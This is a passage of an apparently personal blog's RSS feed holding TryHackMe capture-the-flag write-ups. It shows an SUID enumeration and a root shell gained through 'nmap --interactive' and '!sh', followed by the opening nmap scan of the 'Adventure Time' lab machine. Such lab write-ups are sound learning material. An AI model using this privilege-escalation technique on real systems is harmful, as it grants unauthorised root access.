&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">find / -type f -perm -04000 -ls 2&amp;gt;/dev/null
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">15068&lt;/span> &lt;span class="m">44&lt;/span> -rwsr-xr-x &lt;span class="m">1&lt;/span> root root &lt;span class="m">44168&lt;/span> May &lt;span class="m">7&lt;/span> &lt;span class="m">2014&lt;/span> /bin/ping
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">15093&lt;/span> &lt;span class="m">68&lt;/span> -rwsr-xr-x &lt;span class="m">1&lt;/span> root root &lt;span class="m">69120&lt;/span> Feb &lt;span class="m">12&lt;/span> &lt;span class="m">2015&lt;/span> /bin/umount
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">15060&lt;/span> &lt;span class="m">96&lt;/span> -rwsr-xr-x &lt;span class="m">1&lt;/span> root root &lt;span class="m">94792&lt;/span> Feb &lt;span class="m">12&lt;/span> &lt;span class="m">2015&lt;/span> /bin/mount
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">15069&lt;/span> &lt;span class="m">44&lt;/span> -rwsr-xr-x &lt;span class="m">1&lt;/span> root root &lt;span class="m">44680&lt;/span> May &lt;span class="m">7&lt;/span> &lt;span class="m">2014&lt;/span> /bin/ping6
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">15085&lt;/span> &lt;span class="m">40&lt;/span> -rwsr-xr-x &lt;span class="m">1&lt;/span> root root &lt;span class="m">36936&lt;/span> Feb &lt;span class="m">17&lt;/span> &lt;span class="m">2014&lt;/span> /bin/su
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">36231&lt;/span> &lt;span class="m">48&lt;/span> -rwsr-xr-x &lt;span class="m">1&lt;/span> root root &lt;span class="m">47032&lt;/span> Feb &lt;span class="m">17&lt;/span> &lt;span class="m">2014&lt;/span> /usr/bin/passwd
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">36216&lt;/span> &lt;span class="m">32&lt;/span> -rwsr-xr-x &lt;span class="m">1&lt;/span> root root &lt;span class="m">32464&lt;/span> Feb &lt;span class="m">17&lt;/span> &lt;span class="m">2014&lt;/span> /usr/bin/newgrp
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">36041&lt;/span> &lt;span class="m">44&lt;/span> -rwsr-xr-x &lt;span class="m">1&lt;/span> root root &lt;span class="m">41336&lt;/span> Feb &lt;span class="m">17&lt;/span> &lt;span class="m">2014&lt;/span> /usr/bin/chsh
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">36038&lt;/span> &lt;span class="m">48&lt;/span> -rwsr-xr-x &lt;span class="m">1&lt;/span> root root &lt;span class="m">46424&lt;/span> Feb &lt;span class="m">17&lt;/span> &lt;span class="m">2014&lt;/span> /usr/bin/chfn
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">36148&lt;/span> &lt;span class="m">68&lt;/span> -rwsr-xr-x &lt;span class="m">1&lt;/span> root root &lt;span class="m">68152&lt;/span> Feb &lt;span class="m">17&lt;/span> &lt;span class="m">2014&lt;/span> /usr/bin/gpasswd
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">36349&lt;/span> &lt;span class="m">152&lt;/span> -rwsr-xr-x &lt;span class="m">1&lt;/span> root root &lt;span class="m">155008&lt;/span> Mar &lt;span class="m">12&lt;/span> &lt;span class="m">2015&lt;/span> /usr/bin/sudo
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">34835&lt;/span> &lt;span class="m">496&lt;/span> -rwsr-xr-x &lt;span class="m">1&lt;/span> root root &lt;span class="m">504736&lt;/span> Nov &lt;span class="m">13&lt;/span> &lt;span class="m">2015&lt;/span> /usr/local/bin/nmap
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">38768&lt;/span> &lt;span class="m">432&lt;/span> -rwsr-xr-x &lt;span class="m">1&lt;/span> root root &lt;span class="m">440416&lt;/span> May &lt;span class="m">12&lt;/span> &lt;span class="m">2014&lt;/span> /usr/lib/openssh/ssh-keysign
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">38526&lt;/span> &lt;span class="m">12&lt;/span> -rwsr-xr-x &lt;span class="m">1&lt;/span> root root &lt;span class="m">10240&lt;/span> Feb &lt;span class="m">25&lt;/span> &lt;span class="m">2014&lt;/span> /usr/lib/eject/dmcrypt-get-device
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="m">395259&lt;/span> &lt;span class="m">12&lt;/span> -r-sr-xr-x &lt;span class="m">1&lt;/span> root root &lt;span class="m">9532&lt;/span> Nov &lt;span class="m">13&lt;/span> &lt;span class="m">2015&lt;/span> /usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="m">395286&lt;/span> &lt;span class="m">16&lt;/span> -r-sr-xr-x &lt;span class="m">1&lt;/span> root root &lt;span class="m">14320&lt;/span> Nov &lt;span class="m">13&lt;/span> &lt;span class="m">2015&lt;/span> /usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">38505&lt;/span> &lt;span class="m">12&lt;/span> -rwsr-xr-x &lt;span class="m">1&lt;/span> root root &lt;span class="m">10344&lt;/span> Feb &lt;span class="m">25&lt;/span> &lt;span class="m">2015&lt;/span> /usr/lib/pt_chown
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>Nmap can be used in interactive mode:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;span class="lnt">7
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">nmap --interactive
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Starting nmap V. 3.81 &lt;span class="o">(&lt;/span> http://www.insecure.org/nmap/ &lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Welcome to Interactive Mode -- press h &amp;lt;enter&amp;gt; &lt;span class="k">for&lt;/span> &lt;span class="nb">help&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">nmap&amp;gt; !sh
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># whoami&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">root
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>And after that we just want to go in the /root directory and retrieve the flag.&lt;/p></description></item><item><title>Adventure Time Writeup THM</title><link>https://simonefelici.github.io/p/adventure-time-writeup-thm/</link><pubDate>Thu, 18 Jan 2024 00:00:00 +0000</pubDate><guid>https://simonefelici.github.io/p/adventure-time-writeup-thm/</guid><description>&lt;img src="https://raw.githubusercontent.com/Blueaulo/AdventureTime-writeup-THM/main/2156d084-f7ce-479d-b8c4-098ec653c1ed_Export-8951dd85-c9ac-4f1a-82d6-6f0da607c4ac/Adventure%20Time%2044bd355551e24dd4bbf6c95c363d0634/Untitled.png" alt="Featured image of post Adventure Time Writeup THM" />&lt;p>I am going to do a nmap scan:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt"> 10
&lt;/span>&lt;span class="lnt"> 11
&lt;/span>&lt;span class="lnt"> 12
&lt;/span>&lt;span class="lnt"> 13
&lt;/span>&lt;span class="lnt"> 14
&lt;/span>&lt;span class="lnt"> 15
&lt;/span>&lt;span class="lnt"> 16
&lt;/span>&lt;span class="lnt"> 17
&lt;/span>&lt;span class="lnt"> 18
&lt;/span>&lt;span class="lnt"> 19
&lt;/span>&lt;span class="lnt"> 20
&lt;/span>&lt;span class="lnt"> 21
&lt;/span>&lt;span class="lnt"> 22
&lt;/span>&lt;span class="lnt"> 23
&lt;/span>&lt;span class="lnt"> 24
&lt;/span>&lt;span class="lnt"> 25
&lt;/span>&lt;span class="lnt"> 26
&lt;/span>&lt;span class="lnt"> 27
&lt;/span>&lt;span class="lnt"> 28
&lt;/span>&lt;span class="lnt"> 29
&lt;/span>&lt;span class="lnt"> 30
&lt;/span>&lt;span class="lnt"> 31
&lt;/span>&lt;span class="lnt"> 32
&lt;/span>&lt;span class="lnt"> 33
&lt;/span>&lt;span class="lnt"> 34
&lt;/span>&lt;span class="lnt"> 35
&lt;/span>&lt;span class="lnt"> 36
&lt;/span>&lt;span class="lnt"> 37
&lt;/span>&lt;span class="lnt"> 38
&lt;/span>&lt;span class="lnt"> 39
&lt;/span>&lt;span class="lnt"> 40
&lt;/span>&lt;span class="lnt"> 41
&lt;/span>&lt;span class="lnt"> 42
&lt;/span>&lt;span class="lnt"> 43
&lt;/span>&lt;span class="lnt"> 44
&lt;/span>&lt;span class="lnt"> 45
&lt;/span>&lt;span class="lnt"> 46
&lt;/span>&lt;span class="lnt"> 47
&lt;/span>&lt;span class="lnt"> 48
&lt;/span>&lt;span class="lnt"> 49
&lt;/span>&lt;span class="lnt"> 50
&lt;/span>&lt;span class="lnt"> 51
&lt;/span>&lt;span class="lnt"> 52
&lt;/span>&lt;span class="lnt"> 53
&lt;/span>&lt;span class="lnt"> 54
&lt;/span>&lt;span class="lnt"> 55
&lt;/span>&lt;span class="lnt"> 56
&lt;/span>&lt;span class="lnt"> 57
&lt;/span>&lt;span class="lnt"> 58
&lt;/span>&lt;span class="lnt"> 59
&lt;/span>&lt;span class="lnt"> 60
&lt;/span>&lt;span class="lnt"> 61
&lt;/span>&lt;span class="lnt"> 62
&lt;/span>&lt;span class="lnt"> 63
&lt;/span>&lt;span class="lnt"> 64
&lt;/span>&lt;span class="lnt"> 65
&lt;/span>&lt;span class="lnt"> 66
&lt;/span>&lt;span class="lnt"> 67
&lt;/span>&lt;span class="lnt"> 68
&lt;/span>&lt;span class="lnt"> 69
&lt;/span>&lt;span class="lnt"> 70
&lt;/span>&lt;span class="lnt"> 71
&lt;/span>&lt;span class="lnt"> 72
&lt;/span>&lt;span class="lnt"> 73
&lt;/span>&lt;span class="lnt"> 74
&lt;/span>&lt;span class="lnt"> 75
&lt;/span>&lt;span class="lnt"> 76
&lt;/span>&lt;span class="lnt"> 77
&lt;/span>&lt;span class="lnt"> 78
&lt;/span>&lt;span class="lnt"> 79
&lt;/span>&lt;span class="lnt"> 80
&lt;/span>&lt;span class="lnt"> 81
&lt;/span>&lt;span class="lnt"> 82
&lt;/span>&lt;span class="lnt"> 83
&lt;/span>&lt;span class="lnt"> 84
&lt;/span>&lt;span class="lnt"> 85
&lt;/span>&lt;span class="lnt"> 86
&lt;/span>&lt;span class="lnt"> 87
&lt;/span>&lt;span class="lnt"> 88
&lt;/span>&lt;span class="lnt"> 89
&lt;/span>&lt;span class="lnt"> 90
&lt;/span>&lt;span class="lnt"> 91
&lt;/span>&lt;span class="lnt"> 92
&lt;/span>&lt;span class="lnt"> 93
&lt;/span>&lt;span class="lnt"> 94
&lt;/span>&lt;span class="lnt"> 95
&lt;/span>&lt;span class="lnt"> 96
&lt;/span>&lt;span class="lnt"> 97
&lt;/span>&lt;span class="lnt"> 98
&lt;/span>&lt;span class="lnt"> 99
&lt;/span>&lt;span class="lnt">100
&lt;/span>&lt;span class="lnt">101
&lt;/span>&lt;span class="lnt">102
&lt;/span>&lt;span class="lnt">103
&lt;/span>&lt;span class="lnt">104
&lt;/span>&lt;span class="lnt">105
&lt;/span>&lt;span class="lnt">106
&lt;/span>&lt;span class="lnt">107
&lt;/span>&lt;span class="lnt">108
&lt;/span>&lt;span class="lnt">109
&lt;/span>&lt;span class="lnt">110
&lt;/span>&lt;span class="lnt">111
&lt;/span>&lt;span class="lnt">112
&lt;/span>&lt;span class="lnt">113
&lt;/span>&lt;span class="lnt">114
&lt;/span>&lt;span class="lnt">115
&lt;/span>&lt;span class="lnt">116
&lt;/span>&lt;span class="lnt">117
&lt;/span>&lt;span class="lnt">118
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">nmap -T4 -A 10.10.237.150
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Starting Nmap 7.94SVN &lt;span class="o">(&lt;/span> https://nmap.org &lt;span class="o">)&lt;/span> at 2024-01-08 13:55 EST
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Nmap scan report &lt;span class="k">for&lt;/span> 10.10.237.150
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Host is up &lt;span class="o">(&lt;/span>0.057s latency&lt;span class="o">)&lt;/span>.
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Not shown: &lt;span class="m">995&lt;/span> closed tcp ports &lt;span class="o">(&lt;/span>conn-refused&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">PORT STATE SERVICE VERSION
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">21/tcp open ftp vsftpd 3.0.3
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> ftp-syst:
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> STAT:
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> FTP server status:
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> Connected to ::ffff:10.11.65.91
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> Logged in as ftp
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> TYPE: ASCII
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> No session bandwidth limit
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> Session timeout in seconds is &lt;span class="m">300&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> Control connection is plain text
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> Data connections will be plain text
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> At session startup, client count was &lt;span class="m">4&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> vsFTPd 3.0.3 - secure, fast, stable
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span>_End of status
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> ftp-anon: Anonymous FTP login allowed &lt;span class="o">(&lt;/span>FTP code 230&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> -r--r--r-- &lt;span class="m">1&lt;/span> ftp ftp &lt;span class="m">1401357&lt;/span> Sep &lt;span class="m">21&lt;/span> &lt;span class="m">2019&lt;/span> 1.jpg
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> -r--r--r-- &lt;span class="m">1&lt;/span> ftp ftp &lt;span class="m">233977&lt;/span> Sep &lt;span class="m">21&lt;/span> &lt;span class="m">2019&lt;/span> 2.jpg
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> -r--r--r-- &lt;span class="m">1&lt;/span> ftp ftp &lt;span class="m">524615&lt;/span> Sep &lt;span class="m">21&lt;/span> &lt;span class="m">2019&lt;/span> 3.jpg
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> -r--r--r-- &lt;span class="m">1&lt;/span> ftp ftp &lt;span class="m">771076&lt;/span> Sep &lt;span class="m">21&lt;/span> &lt;span class="m">2019&lt;/span> 4.jpg
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> -r--r--r-- &lt;span class="m">1&lt;/span> ftp ftp &lt;span class="m">1644395&lt;/span> Sep &lt;span class="m">21&lt;/span> &lt;span class="m">2019&lt;/span> 5.jpg
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span>_-r--r--r-- &lt;span class="m">1&lt;/span> ftp ftp &lt;span class="m">40355&lt;/span> Sep &lt;span class="m">21&lt;/span> &lt;span class="m">2019&lt;/span> 6.jpg
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">22/tcp open ssh OpenSSH 7.6p1 Ubuntu &lt;span class="m">4&lt;/span> &lt;span class="o">(&lt;/span>Ubuntu Linux&lt;span class="p">;&lt;/span> protocol 2.0&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> ssh-hostkey:
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> &lt;span class="m">2048&lt;/span> 58:d2:86:99:c2:62:2d:95:d0:75:9c:4e:83:b6:1b:ca &lt;span class="o">(&lt;/span>RSA&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> &lt;span class="m">256&lt;/span> db:87:9e:06:43:c7:6e:00:7b:c3:bc:a1:97:dd:5e:83 &lt;span class="o">(&lt;/span>ECDSA&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span>_ &lt;span class="m">256&lt;/span> 6b:40:84:e6:9c:bc:1c:a8:de:b2:a1:8b:a3:6a:ef:f0 &lt;span class="o">(&lt;/span>ED25519&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">80/tcp open http Apache httpd 2.4.29
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span>_http-server-header: Apache/2.4.29 &lt;span class="o">(&lt;/span>Ubuntu&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span>_http-title: &lt;span class="m">404&lt;/span> Not Found
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">443/tcp open ssl/http Apache httpd 2.4.29 &lt;span class="o">((&lt;/span>Ubuntu&lt;span class="o">))&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> tls-alpn:
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span>_ http/1.1
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> ssl-cert: Subject: &lt;span class="nv">commonName&lt;/span>&lt;span class="o">=&lt;/span>adventure-time.com/organizationName&lt;span class="o">=&lt;/span>Candy Corporate Inc./stateOrProvinceName&lt;span class="o">=&lt;/span>Candy Kingdom/countryName&lt;span class="o">=&lt;/span>CK
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> Not valid before: 2019-09-20T08:29:36
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span>_Not valid after: 2020-09-19T08:29:36
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span>_http-server-header: Apache/2.4.29 &lt;span class="o">(&lt;/span>Ubuntu&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span>_http-title: You found Finn
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span>_ssl-date: TLS randomness does not represent &lt;span class="nb">time&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">31337/tcp open Elite?
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> fingerprint-strings:
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> DNSStatusRequestTCP, RPCCheck, SSLSessionReq:
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> Hello Princess Bubblegum. What is the magic word?
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> magic word is not
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> DNSVersionBindReqTCP:
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> Hello Princess Bubblegum. What is the magic word?
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> magic word is not
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> version
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> &lt;span class="nb">bind&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> GenericLines, NULL:
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> Hello Princess Bubblegum. What is the magic word?
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> GetRequest:
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> Hello Princess Bubblegum. What is the magic word?
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> magic word is not GET / HTTP/1.0
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> HTTPOptions:
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> Hello Princess Bubblegum. What is the magic word?
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> magic word is not OPTIONS / HTTP/1.0
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> Help:
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> Hello Princess Bubblegum. What is the magic word?
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> magic word is not HELP
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> RTSPRequest:
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> Hello Princess Bubblegum. What is the magic word?
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> magic word is not OPTIONS / RTSP/1.0
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> SIPOptions:
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> Hello Princess Bubblegum. What is the magic word?
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> magic word is not OPTIONS sip:nm SIP/2.0
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> Via: SIP/2.0/TCP nm&lt;span class="p">;&lt;/span>&lt;span class="nv">branch&lt;/span>&lt;span class="o">=&lt;/span>foo
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> From: &amp;lt;sip:nm@nm&amp;gt;&lt;span class="p">;&lt;/span>&lt;span class="nv">tag&lt;/span>&lt;span class="o">=&lt;/span>root
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> &amp;lt;sip:nm2@nm2&amp;gt;
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> Call-ID: &lt;span class="m">50000&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> CSeq: &lt;span class="m">42&lt;/span> OPTIONS
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> Max-Forwards: &lt;span class="m">70&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> Content-Length: &lt;span class="m">0&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> Contact: &amp;lt;sip:nm@nm&amp;gt;
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span>_ Accept: application/sdp
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="m">1&lt;/span> service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">SF-Port31337-TCP:V&lt;span class="o">=&lt;/span>7.94SVN%I&lt;span class="o">=&lt;/span>7%D&lt;span class="o">=&lt;/span>1/8%Time&lt;span class="o">=&lt;/span>659C452A%P&lt;span class="o">=&lt;/span>x86_64-pc-linux-gnu%r
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">SF:&lt;span class="o">(&lt;/span>NULL,32,&lt;span class="s2">&amp;#34;Hello\x20Princess\x20Bubblegum\.\x20What\x20is\x20the\x20magi
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2">SF:c\x20word\?\n&amp;#34;&lt;/span>&lt;span class="o">)&lt;/span>%r&lt;span class="o">(&lt;/span>GetRequest,57,&lt;span class="s2">&amp;#34;Hello\x20Princess\x20Bubblegum\.\x20Wh
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2">SF:at\x20is\x20the\x20magic\x20word\?\nThe\x20magic\x20word\x20is\x20not\x
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2">SF:20GET\x20/\x20HTTP/1\.0\n&amp;#34;&lt;/span>&lt;span class="o">)&lt;/span>%r&lt;span class="o">(&lt;/span>SIPOptions,124,&lt;span class="s2">&amp;#34;Hello\x20Princess\x20Bubb
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2">SF:legum\.\x20What\x20is\x20the\x20magic\x20word\?\nThe\x20magic\x20word\x
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2">SF:20is\x20not\x20OPTIONS\x20sip:nm\x20SIP/2\.0\r\nVia:\x20SIP/2\.0/TCP\x2
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2">SF:0nm;branch=foo\r\nFrom:\x20&amp;lt;sip:nm@nm&amp;gt;;tag=root\r\nTo:\x20&amp;lt;sip:nm2@nm2&amp;gt;
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2">SF:\r\nCall-ID:\x2050000\r\nCSeq:\x2042\x20OPTIONS\r\nMax-Forwards:\x2070\
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2">SF:r\nContent-Length:\x200\r\nContact:\x20&amp;lt;sip:nm@nm&amp;gt;\r\nAccept:\x20applic
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2">SF:ation/sdp\n&amp;#34;&lt;/span>&lt;span class="o">)&lt;/span>%r&lt;span class="o">(&lt;/span>GenericLines,32,&lt;span class="s2">&amp;#34;Hello\x20Princess\x20Bubblegum\.\x20Wh
